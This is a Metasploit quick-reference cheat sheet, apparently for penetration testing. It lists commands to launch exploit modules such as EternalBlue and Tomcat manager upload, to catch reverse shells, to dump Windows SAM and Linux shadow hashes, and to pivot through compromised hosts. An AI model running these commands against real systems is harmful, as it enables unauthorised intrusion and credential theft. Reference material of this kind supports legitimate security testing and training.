# Metasploit Quick Reference

## Core Commands

```bash
msfconsole -q                          # start (quiet mode)
search apache tomcat                   # find modules
use exploit/multi/http/tomcat_mgr_upload
show options                           # see required settings
set RHOSTS TARGET
set LHOST KALI
set LPORT 4444
exploit / run

sessions -l                           # list sessions
sessions -i 1                         # interact with session 1
background                            # background current session
```

## Handler (catch reverse shells)

```bash
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST KALI
set LPORT 4444
run
```

## Post-Exploitation Modules

```bash
use post/multi/recon/local_exploit_suggester    # find privesc
use post/windows/gather/hashdump                # dump SAM
use post/linux/gather/hashdump                  # dump shadow

run autoroute -s 172.16.0.0/24                  # pivot through session
use auxiliary/server/socks_proxy                 # SOCKS for external tools
```

## Common Exploits

```bash
exploit/multi/http/tomcat_mgr_upload            # Tomcat WAR upload
exploit/windows/smb/ms17_010_eternalblue        # EternalBlue
exploit/multi/misc/apache_activemq_rce_cve_2023_46604
exploit/linux/http/nagios_xi_authenticated_rce
exploit/windows/http/prtg_authenticated_rce
```

## Database

```bash
db_nmap -sV -sC TARGET                  # scan and store results
hosts                                    # list discovered hosts
services                                 # list discovered services
vulns                                    # list discovered vulns
```
